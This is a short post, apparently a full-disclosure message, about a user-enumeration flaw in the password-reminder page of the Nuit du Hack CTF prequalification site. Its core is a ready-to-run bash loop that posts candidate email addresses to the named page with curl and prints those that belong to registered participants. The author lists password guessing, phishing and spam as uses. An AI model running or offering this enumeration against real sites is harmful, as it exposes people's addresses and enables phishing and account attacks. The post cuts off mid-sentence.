BTW and on completely unrelated note there is an attack which could
allow an attacker to guess the addresses of the participants as long as
they are on a database owned by him. This attack works by consulting the
page as if it were a yes/no oracle and using the results to know wether
an address is on the page database or not.

Usages of the attack? Well, trying to guess participants passwords,
phising attacks, spamming ... Pick your choice xD

And as with any good full disclosure here you go a nice script to
exploit it:
while read email; do curl -s -o-
http://prequals.nuitduhack.com/rememberme.php -d "mail=$email" | fgrep
'<div class="error">This mail doesn'\''t correspond to any
account</div>' > /dev/null && echo Failure || echo "$email"; done

Well don't be bad with it, participants have no fault of this,

PS: What I wonder now is, are the guys behind the CTF reading
